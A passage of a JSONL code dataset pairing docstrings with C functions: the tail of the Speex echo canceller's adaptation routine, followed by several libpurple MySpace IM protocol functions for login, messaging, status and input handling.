SHR32(MULT16_16(N, 10000),6)))\n   {\n      /* AEC seems to add lots of echo instead of removing it, let's see if it will improve */\n      st->screwed_up++;\n   } else {\n      /* Everything's fine */\n      st->screwed_up=0;\n   }\n   if (st->screwed_up>=50)\n   {\n      speex_warning(\"The echo canceller started acting funny and got slapped (reset). It swears it will behave now.\");\n      speex_echo_state_reset(st);\n      return;\n   }\n\n   /* Add a small noise floor to make sure not to have problems when dividing */\n   See = MAX32(See, SHR32(MULT16_16(N, 100),6));\n     \n   for (speak = 0; speak < K; speak++)\n   {\n      Sxx += mdf_inner_prod(st->x+speak*N+st->frame_size, st->x+speak*N+st->frame_size, st->frame_size);\n      power_spectrum_accum(st->X+speak*N, st->Xf, N);\n   }\n\n   \n   /* Smooth far end energy estimate over time */\n   for (j=0;j<=st->frame_size;j++)\n      st->power[j] = MULT16_32_Q15(ss_1,st->power[j]) + 1 + MULT16_32_Q15(ss,st->Xf[j]);\n\n   /* Compute filtered spectra and (cross-)correlations */\n   for (j=st->frame_size;j>=0;j--)\n   {\n      spx_float_t Eh, Yh;\n      Eh = PSEUDOFLOAT(st->Rf[j] - st->Eh[j]);\n      Yh = PSEUDOFLOAT(st->Yf[j] - st->Yh[j]);\n      Pey = FLOAT_ADD(Pey,FLOAT_MULT(Eh,Yh));\n      Pyy = FLOAT_ADD(Pyy,FLOAT_MULT(Yh,Yh));\n#ifdef FIXED_POINT\n      st->Eh[j] = MAC16_32_Q15(MULT16_32_Q15(SUB16(32767,st->spec_average),st->Eh[j]), st->spec_average, st->Rf[j]);\n      st->Yh[j] = MAC16_32_Q15(MULT16_32_Q15(SUB16(32767,st->spec_average),st->Yh[j]), st->spec_average, st->Yf[j]);\n#else\n      st->Eh[j] = (1-st->spec_average)*st->Eh[j] + st->spec_average*st->Rf[j];\n      st->Yh[j] = (1-st->spec_average)*st->Yh[j] + st->spec_average*st->Yf[j];\n#endif\n   }\n   \n   Pyy = FLOAT_SQRT(Pyy);\n   Pey = FLOAT_DIVU(Pey,Pyy);\n\n   /* Compute correlation updatete rate */\n   tmp32 = MULT16_32_Q15(st->beta0,Syy);\n   if (tmp32 > MULT16_32_Q15(st->beta_max,See))\n      tmp32 = MULT16_32_Q15(st->beta_max,See);\n   alpha = FLOAT_DIV32(tmp32, See);\n   alpha_1 = FLOAT_SUB(FLOAT_ONE, alpha);\n   /* Update correlations (recursive average) */\n   st->Pey = FLOAT_ADD(FLOAT_MULT(alpha_1,st->Pey) , FLOAT_MULT(alpha,Pey));\n   st->Pyy = FLOAT_ADD(FLOAT_MULT(alpha_1,st->Pyy) , FLOAT_MULT(alpha,Pyy));\n   if (FLOAT_LT(st->Pyy, FLOAT_ONE))\n      st->Pyy = FLOAT_ONE;\n   /* We don't really hope to get better than 33 dB (MIN_LEAK-3dB) attenuation anyway */\n   if (FLOAT_LT(st->Pey, FLOAT_MULT(MIN_LEAK,st->Pyy)))\n      st->Pey = FLOAT_MULT(MIN_LEAK,st->Pyy);\n   if (FLOAT_GT(st->Pey, st->Pyy))\n      st->Pey = st->Pyy;\n   /* leak_estimate is the linear regression result */\n   st->leak_estimate = FLOAT_EXTRACT16(FLOAT_SHL(FLOAT_DIVU(st->Pey, st->Pyy),14));\n   /* This looks like a stupid bug, but it's right (because we convert from Q14 to Q15) */\n   if (st->leak_estimate > 16383)\n      st->leak_estimate = 32767;\n   else\n      st->leak_estimate = SHL16(st->leak_estimate,1);\n   /*printf (\"%f\\n\", st->leak_estimate);*/\n   \n   /* Compute Residual to Error Ratio */\n#ifdef FIXED_POINT\n   tmp32 = MULT16_32_Q15(st->leak_estimate,Syy);\n   tmp32 = ADD32(SHR32(Sxx,13), ADD32(tmp32, SHL32(tmp32,1)));\n   /* Check for y in e (lower bound on RER) */\n   {\n      spx_float_t bound = PSEUDOFLOAT(Sey);\n      bound = FLOAT_DIVU(FLOAT_MULT(bound, bound), PSEUDOFLOAT(ADD32(1,Syy)));\n      if (FLOAT_GT(bound, PSEUDOFLOAT(See)))\n         tmp32 = See;\n      else if (tmp32 < FLOAT_EXTRACT32(bound))\n         tmp32 = FLOAT_EXTRACT32(bound);\n   }\n   if (tmp32 > SHR32(See,1))\n      tmp32 = SHR32(See,1);\n   RER = FLOAT_EXTRACT16(FLOAT_SHL(FLOAT_DIV32(tmp32,See),15));\n#else\n   RER = (.0001*Sxx + 3.*MULT16_32_Q15(st->leak_estimate,Syy)) / See;\n   /* Check for y in e (lower bound on RER) */\n   if (RER < Sey*Sey/(1+See*Syy))\n      RER = Sey*Sey/(1+See*Syy);\n   if (RER > .5)\n      RER = .5;\n#endif\n\n   /* We consider that the filter has had minimal adaptation if the following is true*/\n   if (!st->adapted && st->sum_adapt > SHL32(EXTEND32(M),15) && MULT16_32_Q15(st->leak_estimate,Syy) > MULT16_32_Q15(QCONST16(.03f,15),Syy))\n   {\n      st->adapted = 1;\n   }\n\n   if (st->adapted)\n   {\n      /* Normal learning rate calculation once we're past the minimal adaptation phase */\n      for (i=0;i<=st->frame_size;i++)\n      {\n         spx_word32_t r, e;\n         /* Compute frequency-domain adaptation mask */\n         r = MULT16_32_Q15(st->leak_estimate,SHL32(st->Yf[i],3));\n         e = SHL32(st->Rf[i],3)+1;\n#ifdef FIXED_POINT\n         if (r>SHR32(e,1))\n            r = SHR32(e,1);\n#else\n         if (r>.5*e)\n            r = .5*e;\n#endif\n         r = MULT16_32_Q15(QCONST16(.7,15),r) + MULT16_32_Q15(QCONST16(.3,15),(spx_word32_t)(MULT16_32_Q15(RER,e)));\n         /*st->power_1[i] = adapt_rate*r/(e*(1+st->power[i]));*/\n         st->power_1[i] = FLOAT_SHL(FLOAT_DIV32_FLOAT(r,FLOAT_MUL32U(e,st->power[i]+10)),WEIGHT_SHIFT+16);\n      }\n   } else {\n      /* Temporary adaption rate if filter is not yet adapted enough */\n      spx_word16_t adapt_rate=0;\n\n      if (Sxx > SHR32(MULT16_16(N, 1000),6)) \n      {\n         tmp32 = MULT16_32_Q15(QCONST16(.25f, 15), Sxx);\n#ifdef FIXED_POINT\n         if (tmp32 > SHR32(See,2))\n            tmp32 = SHR32(See,2);\n#else\n         if (tmp32 > .25*See)\n            tmp32 = .25*See;\n#endif\n         adapt_rate = FLOAT_EXTRACT16(FLOAT_SHL(FLOAT_DIV32(tmp32, See),15));\n      }\n      for (i=0;i<=st->frame_size;i++)\n         st->power_1[i] = FLOAT_SHL(FLOAT_DIV32(EXTEND32(adapt_rate),ADD32(st->power[i],10)),WEIGHT_SHIFT+1);\n\n\n      /* How much have we adapted so far? */\n      st->sum_adapt = ADD32(st->sum_adapt,adapt_rate);\n   }\n\n   /* FIXME: MC conversion required */ \n      for (i=0;i<st->frame_size;i++)\n         st->last_y[i] = st->last_y[st->frame_size+i];\n   if (st->adapted)\n   {\n      /* If the filter is adapted, take the filtered echo */\n      for (i=0;i<st->frame_size;i++)\n         st->last_y[st->frame_size+i] = in[i]-out[i];\n   } else {\n      /* If filter isn't adapted yet, all we can do is take the far end signal directly */\n      /* moved earlier: for (i=0;i<N;i++)\n      st->last_y[i] = st->x[i];*/\n   }\n\n}", "path": "speexjni\\jni\\libspeex\\mdf.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/**\n * Start logging in to the MSIM servers.\n *\n * @param acct Account information to use to login.\n */\n", "func_signal": "static void\nmsim_login(PurpleAccount *acct)", "code": "{\n\tPurpleConnection *gc;\n\tconst gchar *host;\n\tint port;\n\n\tg_return_if_fail(acct != NULL);\n\tg_return_if_fail(acct->username != NULL);\n\n\tpurple_debug_info(\"msim\", \"logging in %s\\n\", acct->username);\n\n\tgc = purple_account_get_connection(acct);\n\tgc->proto_data = msim_session_new(acct);\n\tgc->flags |= PURPLE_CONNECTION_HTML | PURPLE_CONNECTION_NO_URLDESC;\n\n\t/*\n\t * Lets wipe out our local list of blocked buddies.  We'll get a\n\t * list of all blocked buddies from the server, and we shouldn't\n\t * have stuff in the local list that isn't on the server list.\n\t */\n\twhile (acct->deny != NULL)\n\t\tpurple_privacy_deny_remove(acct, acct->deny->data, TRUE);\n\n\t/* 1. connect to server */\n\tpurple_connection_update_progress(gc, _(\"Connecting\"),\n\t\t\t\t\t\t\t\t  0,   /* which connection step this is */\n\t\t\t\t\t\t\t\t  4);  /* total number of steps */\n\n\thost = purple_account_get_string(acct, \"server\", MSIM_SERVER);\n\tport = purple_account_get_int(acct, \"port\", MSIM_PORT);\n\n\t/* From purple.sf.net/api:\n\t * \"\"\"Note that this function name can be misleading--although it is called\n\t * \"proxy connect,\" it is used for establishing any outgoing TCP connection,\n\t * whether through a proxy or not.\"\"\" */\n\n\t/* Calls msim_connect_cb when connected. */\n\tif (!purple_proxy_connect(gc, acct, host, port, msim_connect_cb, gc)) {\n\t\t/* TODO: try other ports if in auto mode, then save\n\t\t * working port and try that first next time. */\n\t\tpurple_connection_error_reason (gc,\n\t\t\tPURPLE_CONNECTION_ERROR_NETWORK_ERROR,\n\t\t\t_(\"Unable to connect\"));\n\t\treturn;\n\t}\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Send a buddy message of a given type.\n *\n * @param session\n * @param who Username to send message to.\n * @param text Message text to send. Not freed; will be copied.\n * @param type A MSIM_BM_* constant.\n *\n * @return TRUE if success, FALSE if fail.\n *\n * Buddy messages ('bm') include instant messages, action messages, status messages, etc.\n */\n", "func_signal": "gboolean\nmsim_send_bm(MsimSession *session, const gchar *who, const gchar *text,\n\t\tint type)", "code": "{\n\tgboolean rc;\n\tMsimMessage *msg;\n\tconst gchar *from_username;\n\n\tg_return_val_if_fail(who != NULL, FALSE);\n\tg_return_val_if_fail(text != NULL, FALSE);\n\n\tfrom_username = session->account->username;\n\n\tg_return_val_if_fail(from_username != NULL, FALSE);\n\n\tpurple_debug_info(\"msim\", \"sending %d message from %s to %s: %s\\n\",\n\t\t\t\t  type, from_username, who, text);\n\n\tmsg = msim_msg_new(\n\t\t\t\"bm\", MSIM_TYPE_INTEGER, GUINT_TO_POINTER(type),\n\t\t\t\"sesskey\", MSIM_TYPE_INTEGER, GUINT_TO_POINTER(session->sesskey),\n\t\t\t/* 't' will be inserted here */\n\t\t\t\"cv\", MSIM_TYPE_INTEGER, GUINT_TO_POINTER(MSIM_CLIENT_VERSION),\n\t\t\t\"msg\", MSIM_TYPE_STRING, g_strdup(text),\n\t\t\tNULL);\n\n\trc = msim_postprocess_outgoing(session, msg, who, \"t\", \"cv\");\n\n\tmsim_msg_free(msg);\n\n\treturn rc;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Process an incoming media (message background?) message.\n */\n", "func_signal": "static gboolean\nmsim_incoming_media(MsimSession *session, MsimMessage *msg)", "code": "{\n\tgchar *username, *text;\n\n\tusername = msim_msg_get_string(msg, \"_username\");\n\ttext = msim_msg_get_string(msg, \"msg\");\n\n\tg_return_val_if_fail(username != NULL, FALSE);\n\tg_return_val_if_fail(text != NULL, FALSE);\n\n\tpurple_debug_info(\"msim\", \"msim_incoming_media: from %s, got msg=%s\\n\", username, text);\n\n\t/* Media messages are sent when the user opens a window to someone.\n\t * Tell libpurple they started typing and stopped typing, to inform the Psychic\n\t * Mode plugin so it too can open a window to the user. */\n\tserv_got_typing(session->gc, username, 0, PURPLE_TYPING);\n\tserv_got_typing_stopped(session->gc, username);\n\n\tg_free(username);\n\n\treturn TRUE;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Go idle.\n */\n", "func_signal": "static void\nmsim_set_idle(PurpleConnection *gc, int time)", "code": "{\n\tMsimSession *session;\n\tPurpleStatus *status;\n\n\tg_return_if_fail(gc != NULL);\n\n\tsession = (MsimSession *)gc->proto_data;\n\n\tstatus = purple_account_get_active_status(session->account);\n\n\tif (time == 0) {\n\t\t/* Going back from idle. In msim, idle is mutually exclusive\n\t\t * from the other states (you can only be away or idle, but not\n\t\t * both, for example), so by going non-idle I go back to what\n\t\t * libpurple says I should be.\n\t\t */\n\t\tmsim_set_status(session->account, status);\n\t} else {\n\t\tconst gchar *message;\n\t\tgchar *stripped;\n\n\t\t/* Set the idle message to the status message from the real\n\t\t * current status.\n\t\t */\n\t\tmessage = purple_status_get_attr_string(status, \"message\");\n\t\tif (message != NULL)\n\t\t\tstripped = purple_markup_strip_html(message);\n\t\telse\n\t\t\tstripped = g_strdup(\"\");\n\n\t\t/* msim doesn't support idle time, so just go idle */\n\t\tmsim_set_status_code(session, MSIM_STATUS_CODE_IDLE, stripped);\n\t}\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Process a message.\n *\n * @param session\n * @param msg A message from the server, ready for processing (possibly with resolved username information attached). Caller frees.\n *\n * @return TRUE if successful. FALSE if processing failed.\n */\n", "func_signal": "static gboolean\nmsim_process(MsimSession *session, MsimMessage *msg)", "code": "{\n\tg_return_val_if_fail(session != NULL, FALSE);\n\tg_return_val_if_fail(msg != NULL, FALSE);\n\n\tif (msim_msg_get_integer(msg, \"lc\") == 1) {\n\t\treturn msim_login_challenge(session, msg);\n\t} else if (msim_msg_get_integer(msg, \"lc\") == 2) {\n\t\t/* return msim_we_are_logged_on(session, msg); */\n\t\tif (msim_is_username_set(session, msg)) {\n\t\t\treturn msim_we_are_logged_on(session);\n\t\t} else {\n\t\t\t/* No username is set... We'll wait for the callbacks to do their work */\n\t\t\t/* When they're all done, the last one will call msim_we_are_logged_on() and pick up where we left off */\n\t\t\treturn FALSE;\n\t\t}\n\t} else if (msim_msg_get(msg, \"bm\"))  {\n\t\treturn msim_incoming_bm(session, msg);\n\t} else if (msim_msg_get(msg, \"rid\")) {\n\t\treturn msim_process_reply(session, msg);\n\t} else if (msim_msg_get(msg, \"error\")) {\n\t\treturn msim_error(session, msg);\n\t} else if (msim_msg_get(msg, \"ka\")) {\n\t\treturn TRUE;\n\t} else {\n\t\tmsim_unrecognized(session, msg, \"in msim_process\");\n\t\treturn FALSE;\n\t}\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Add first ContactID in contact_info to buddy's list. Used to add\n * server-side buddies to client-side list.\n *\n * @return TRUE if added.\n */\n", "func_signal": "static gboolean\nmsim_add_contact_from_server(MsimSession *session, MsimMessage *contact_info)", "code": "{\n\tguint uid;\n\tconst gchar *username;\n\n\tuid = msim_msg_get_integer(contact_info, \"ContactID\");\n\tg_return_val_if_fail(uid != 0, FALSE);\n\n\t/* Lookup the username, since NickName and IMName is unreliable */\n\tusername = msim_uid2username_from_blist(session->account, uid);\n\tif (!username) {\n\t\tgchar *uid_str;\n\n\t\tuid_str = g_strdup_printf(\"%d\", uid);\n\t\tpurple_debug_info(\"msim_add_contact_from_server\",\n\t\t\t\t\"contact_info addr=%p\\n\", contact_info);\n\t\tmsim_lookup_user(session, uid_str, msim_add_contact_from_server_cb, (gpointer)msim_msg_clone(contact_info));\n\t\tg_free(uid_str);\n\t} else {\n\t\tmsim_add_contact_from_server_cb(session, NULL, (gpointer)msim_msg_clone(contact_info));\n\t}\n\n\t/* Say that the contact was added, even if we're still looking up\n\t * their username. */\n\treturn TRUE;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Get possible user status types. Based on mockprpl.\n *\n * @return GList of status types.\n */\n", "func_signal": "static GList *\nmsim_status_types(PurpleAccount *acct)", "code": "{\n\tGList *types;\n\tPurpleStatusType *status;\n\n\tpurple_debug_info(\"myspace\", \"returning status types\\n\");\n\n\ttypes = NULL;\n\n\t/* Statuses are almost all the same. Define a macro to reduce code repetition. */\n#define _MSIM_ADD_NEW_STATUS(prim) status =                         \\\n\tpurple_status_type_new_with_attrs(                          \\\n\tprim,   /* PurpleStatusPrimitive */                         \\\n\tNULL,   /* id - use default */                              \\\n\tNULL,   /* name - use default */                            \\\n\tTRUE,   /* saveable */                                      \\\n\tTRUE,   /* user_settable */                                 \\\n\tFALSE,  /* not independent */                               \\\n\t                                                            \\\n\t/* Attributes - each status can have a message. */          \\\n\t\"message\",                                                  \\\n\t_(\"Message\"),                                               \\\n\tpurple_value_new(PURPLE_TYPE_STRING),                       \\\n\tNULL);                                                      \\\n\t                                                            \\\n\t                                                            \\\n\ttypes = g_list_append(types, status)\n\n\n\t_MSIM_ADD_NEW_STATUS(PURPLE_STATUS_AVAILABLE);\n\t_MSIM_ADD_NEW_STATUS(PURPLE_STATUS_AWAY);\n\t_MSIM_ADD_NEW_STATUS(PURPLE_STATUS_OFFLINE);\n\t_MSIM_ADD_NEW_STATUS(PURPLE_STATUS_INVISIBLE);\n\n\t/* Except tune status is different... */\n\tstatus = purple_status_type_new_with_attrs(\n\t\t\tPURPLE_STATUS_TUNE,\t/* primitive */\n\t\t\t\"tune\",                 /* ID */\n\t\t\tNULL,                   /* name - use default */\n\t\t\tFALSE,                  /* saveable */\n\t\t\tTRUE,                   /* should be user_settable some day */\n\t\t\tTRUE,                   /* independent */\n\n\t\t\tPURPLE_TUNE_ARTIST, _(\"Tune Artist\"), purple_value_new(PURPLE_TYPE_STRING),\n\t\t\tPURPLE_TUNE_TITLE, _(\"Tune Title\"), purple_value_new(PURPLE_TYPE_STRING),\n\t\t\tNULL);\n\n\ttypes = g_list_append(types, status);\n\n\treturn types;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Callback when input available.\n *\n * @param gc_uncasted A PurpleConnection pointer.\n * @param source File descriptor.\n * @param cond PURPLE_INPUT_READ\n *\n * Reads the input, and calls msim_preprocess_incoming() to handle it.\n */\n", "func_signal": "static void\nmsim_input_cb(gpointer gc_uncasted, gint source, PurpleInputCondition cond)", "code": "{\n\tPurpleConnection *gc;\n\tMsimSession *session;\n\tgchar *end;\n\tint n;\n\n\tg_return_if_fail(gc_uncasted != NULL);\n\tg_return_if_fail(source >= 0);  /* Note: 0 is a valid fd */\n\n\tgc = (PurpleConnection *)(gc_uncasted);\n\tsession = gc->proto_data;\n\n\t/* libpurple/eventloop.h only defines these two */\n\tif (cond != PURPLE_INPUT_READ && cond != PURPLE_INPUT_WRITE) {\n\t\tpurple_debug_info(\"msim_input_cb\", \"unknown condition=%d\\n\", cond);\n\t\tpurple_connection_error_reason (gc,\n\t\t\tPURPLE_CONNECTION_ERROR_NETWORK_ERROR,\n\t\t\t_(\"Invalid input condition\"));\n\t\treturn;\n\t}\n\n\tg_return_if_fail(cond == PURPLE_INPUT_READ);\n\n\t/* Mark down that we got data, so we don't timeout. */\n\tsession->last_comm = time(NULL);\n\n\t/* If approaching end of buffer, reallocate some more memory. */\n\tif (session->rxsize < session->rxoff + MSIM_READ_BUF_SIZE) {\n\t\tpurple_debug_info(\"msim\",\n\t\t\t\"msim_input_cb: %d-byte read buffer full, rxoff=%d, \" \"growing by %d bytes\\n\",\n\t\t\tsession->rxsize, session->rxoff, MSIM_READ_BUF_SIZE);\n\t\t\tsession->rxsize += MSIM_READ_BUF_SIZE;\n\t\t\tsession->rxbuf = g_realloc(session->rxbuf, session->rxsize);\n\n\t\treturn;\n\t}\n\n\tpurple_debug_info(\"msim\", \"dynamic buffer at %d (max %d), reading up to %d\\n\",\n\t\t\tsession->rxoff, session->rxsize,\n\t\t\tMSIM_READ_BUF_SIZE - session->rxoff - 1);\n\n\t/* Read into buffer. On Win32, need recv() not read(). session->fd also holds\n\t * the file descriptor, but it sometimes differs from the 'source' parameter.\n\t */\n\tn = recv(session->fd,\n\t\t session->rxbuf + session->rxoff,\n\t\t session->rxsize - session->rxoff - 1, 0);\n\n\tif (n < 0) {\n\t\tgchar *tmp;\n\n\t\tif (errno == EAGAIN)\n\t\t\t/* No worries */\n\t\t\treturn;\n\n\t\ttmp = g_strdup_printf(_(\"Lost connection with server: %s\"),\n\t\t\t\tg_strerror(errno));\n\t\tpurple_connection_error_reason(gc,\n\t\t\t\tPURPLE_CONNECTION_ERROR_NETWORK_ERROR, tmp);\n\t\tg_free(tmp);\n\t\treturn;\n\t} else if (n == 0) {\n\t\tpurple_connection_error_reason(gc,\n\t\t\t\tPURPLE_CONNECTION_ERROR_NETWORK_ERROR,\n\t\t\t\t_(\"Server closed the connection\"));\n\t\treturn;\n\t}\n\n\t/* Null terminate */\n\tpurple_debug_info(\"msim\", \"msim_input_cb: going to null terminate \"\n\t\t\t\"at n=%d\\n\", n);\n\tsession->rxbuf[session->rxoff + n] = 0;\n\n#ifdef MSIM_CHECK_EMBEDDED_NULLS\n\t/* Check for embedded NULs. I don't handle them, and they shouldn't occur. */\n\tif (strlen(session->rxbuf + session->rxoff) != n) {\n\t\t/* Occurs after login, but it is not a null byte. */\n\t\tpurple_debug_info(\"msim\", \"msim_input_cb: strlen=%d, but read %d bytes\"\n\t\t\t\t\"--null byte encountered?\\n\",\n\t\t\t\tstrlen(session->rxbuf + session->rxoff), n);\n\t\t/*purple_connection_error_reason (gc,\n\t\t\t\tPURPLE_CONNECTION_ERROR_NETWORK_ERROR,\n\t\t\t\t\"Invalid message - null byte on input\"); */\n\t\treturn;\n\t}\n#endif\n\n\tsession->rxoff += n;\n\tpurple_debug_info(\"msim\", \"msim_input_cb: read=%d\\n\", n);\n\n#ifdef MSIM_DEBUG_RXBUF\n\tpurple_debug_info(\"msim\", \"buf=<%s>\\n\", session->rxbuf);\n#endif\n\n\t/* Look for \\\\final\\\\ end markers. If found, process message. */\n\twhile((end = strstr(session->rxbuf, MSIM_FINAL_STRING))) {\n\t\tMsimMessage *msg;\n\n#ifdef MSIM_DEBUG_RXBUF\n\t\tpurple_debug_info(\"msim\", \"in loop: buf=<%s>\\n\", session->rxbuf);\n#endif\n\t\t*end = 0;\n\t\tmsg = msim_parse(session->rxbuf);\n\t\tif (!msg) {\n\t\t\tpurple_debug_info(\"msim\", \"msim_input_cb: couldn't parse rxbuf\\n\");\n\t\t\tpurple_connection_error_reason (gc,\n\t\t\t\tPURPLE_CONNECTION_ERROR_NETWORK_ERROR,\n\t\t\t\t_(\"Unable to parse message\"));\n\t\t\tbreak;\n\t\t} else {\n\t\t\t/* Process message and then free it (processing function should\n\t\t\t * clone message if it wants to keep it afterwards.) */\n\t\t\tif (!msim_preprocess_incoming(session, msg)) {\n\t\t\t\tmsim_msg_dump(\"msim_input_cb: preprocessing message failed on msg: %s\\n\", msg);\n\t\t\t}\n\t\t\tmsim_msg_free(msg);\n\t\t}\n\n\t\t/* Move remaining part of buffer to beginning. */\n\t\tsession->rxoff -= strlen(session->rxbuf) + strlen(MSIM_FINAL_STRING);\n\t\tmemmove(session->rxbuf, end + strlen(MSIM_FINAL_STRING),\n\t\t\t\tsession->rxsize - (end + strlen(MSIM_FINAL_STRING) - session->rxbuf));\n\n\t\t/* Clear end of buffer\n\t\t * memset(end, 0, MSIM_READ_BUF_SIZE - (end - session->rxbuf));\n\t\t */\n\t}\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Process a login challenge, sending a response.\n *\n * @param session\n * @param msg Login challenge message.\n *\n * @return TRUE if successful, FALSE if not\n */\n", "func_signal": "static gboolean\nmsim_login_challenge(MsimSession *session, MsimMessage *msg)", "code": "{\n\tPurpleAccount *account;\n\tgchar *response;\n\tguint response_len;\n\tgchar *nc;\n\tgsize nc_len;\n\tgboolean ret;\n\n\tg_return_val_if_fail(msg != NULL, FALSE);\n\n\tg_return_val_if_fail(msim_msg_get_binary(msg, \"nc\", &nc, &nc_len), FALSE);\n\n\taccount = session->account;\n\n\tg_return_val_if_fail(account != NULL, FALSE);\n\n\tpurple_connection_update_progress(session->gc, _(\"Reading challenge\"), 1, 4);\n\n\tpurple_debug_info(\"msim\", \"nc is %\" G_GSIZE_FORMAT\n\t\t\t\" bytes, decoded\\n\", nc_len);\n\n\tif (nc_len != MSIM_AUTH_CHALLENGE_LENGTH) {\n\t\tpurple_debug_info(\"msim\", \"bad nc length: %\" G_GSIZE_MODIFIER\n\t\t\t\t\"x != 0x%x\\n\", nc_len, MSIM_AUTH_CHALLENGE_LENGTH);\n\t\tpurple_connection_error_reason (session->gc,\n\t\t\tPURPLE_CONNECTION_ERROR_NETWORK_ERROR,\n\t\t\t_(\"Unexpected challenge length from server\"));\n\t\treturn FALSE;\n\t}\n\n\tpurple_connection_update_progress(session->gc, _(\"Logging in\"), 2, 4);\n\n\tresponse_len = 0;\n\tresponse = msim_compute_login_response(nc, account->username, account->password, &response_len);\n\n\tg_free(nc);\n\n\tret = msim_send(session,\n\t\t\t\"login2\", MSIM_TYPE_INTEGER, MSIM_AUTH_ALGORITHM,\n\t\t\t/* This is actually user's email address. */\n\t\t\t\"username\", MSIM_TYPE_STRING, g_strdup(account->username),\n\t\t\t/* GString will be freed in msim_msg_free() in msim_send(). */\n\t\t\t\"response\", MSIM_TYPE_BINARY, g_string_new_len(response, response_len),\n\t\t\t\"clientver\", MSIM_TYPE_INTEGER, MSIM_CLIENT_VERSION,\n\t\t\t\"langid\", MSIM_TYPE_INTEGER, MSIM_LANGUAGE_ID_ENGLISH,\n\t\t\t\"imlang\", MSIM_TYPE_STRING, g_strdup(MSIM_LANGUAGE_NAME_ENGLISH),\n\t\t\t\"reconn\", MSIM_TYPE_INTEGER, 0,\n\t\t\t\"status\", MSIM_TYPE_INTEGER, 100,\n\t\t\t\"id\", MSIM_TYPE_INTEGER, 1,\n\t\t\tNULL);\n\n\tg_free(response);\n\n\treturn ret;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Obtain the status text for a buddy.\n *\n * @param buddy The buddy to obtain status text for.\n *\n * @return Status text, or NULL if error. Caller g_free()'s.\n */\n", "func_signal": "static char *\nmsim_status_text(PurpleBuddy *buddy)", "code": "{\n\tMsimUser *user;\n\tconst gchar *display_name = NULL, *headline = NULL;\n\tPurpleAccount *account;\n\n\tg_return_val_if_fail(buddy != NULL, NULL);\n\n\taccount = purple_buddy_get_account(buddy);\n\n\tuser = msim_get_user_from_buddy(buddy, FALSE);\n\tif (user != NULL) {\n\t\t/* Retrieve display name and/or headline, depending on user preference. */\n\t\tif (purple_account_get_bool(account, \"show_headline\", TRUE)) {\n\t\t\theadline = user->headline;\n\t\t}\n\n\t\tif (purple_account_get_bool(account, \"show_display_name\", FALSE)) {\n\t\t\tdisplay_name = user->display_name;\n\t\t}\n\t}\n\n\t/* Return appropriate combination of display name and/or headline, or neither. */\n\n\tif (display_name && headline) {\n\t\treturn g_strconcat(display_name, \" \", headline, NULL);\n\t} else if (display_name) {\n\t\treturn g_strdup(display_name);\n\t} else if (headline) {\n\t\treturn g_strdup(headline);\n\t}\n\n\treturn NULL;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
{"docstring": "/**\n * Process a persistance message reply from the server.\n *\n * @param session\n * @param msg Message reply from server.\n *\n * @return TRUE if successful.\n *\n * msim_lookup_user sets callback for here\n */\n", "func_signal": "static gboolean\nmsim_process_reply(MsimSession *session, MsimMessage *msg)", "code": "{\n\tMSIM_USER_LOOKUP_CB cb;\n\tgpointer data;\n\tguint rid, cmd, dsn, lid;\n\n\tg_return_val_if_fail(msg != NULL, FALSE);\n\n\tmsim_store_user_info(session, msg, NULL);\n\n\trid = msim_msg_get_integer(msg, \"rid\");\n\tcmd = msim_msg_get_integer(msg, \"cmd\");\n\tdsn = msim_msg_get_integer(msg, \"dsn\");\n\tlid = msim_msg_get_integer(msg, \"lid\");\n\n\t/* Unsolicited messages */\n\tif (cmd == (MSIM_CMD_BIT_REPLY | MSIM_CMD_GET)) {\n\t\tif (dsn == MG_SERVER_INFO_DSN && lid == MG_SERVER_INFO_LID) {\n\t\t\treturn msim_process_server_info(session, msg);\n\t\t} else if (dsn == MG_WEB_CHALLENGE_DSN && lid == MG_WEB_CHALLENGE_LID) {\n\t\t\treturn msim_web_challenge(session, msg);\n\t\t}\n\t}\n\n\t/* If a callback is registered for this userid lookup, call it. */\n\tcb = g_hash_table_lookup(session->user_lookup_cb, GUINT_TO_POINTER(rid));\n\tdata = g_hash_table_lookup(session->user_lookup_cb_data, GUINT_TO_POINTER(rid));\n\n\tif (cb) {\n\t\tpurple_debug_info(\"msim\", \"msim_process_reply: calling callback now\\n\");\n\t\t/* Clone message, so that the callback 'cb' can use it (needs to free it also). */\n\t\tcb(session, msg, data);\n\t\tg_hash_table_remove(session->user_lookup_cb, GUINT_TO_POINTER(rid));\n\t\tg_hash_table_remove(session->user_lookup_cb_data, GUINT_TO_POINTER(rid));\n\t} else {\n\t\tpurple_debug_info(\"msim\",\n\t\t\t\t\"msim_process_reply: no callback for rid %d\\n\", rid);\n\t}\n\n\treturn TRUE;\n}", "path": "protocols\\myspace\\myspace.c", "repo_name": "felipec/libpurple-mini", "stars": 32, "license": "None", "language": "c", "size": 5705}
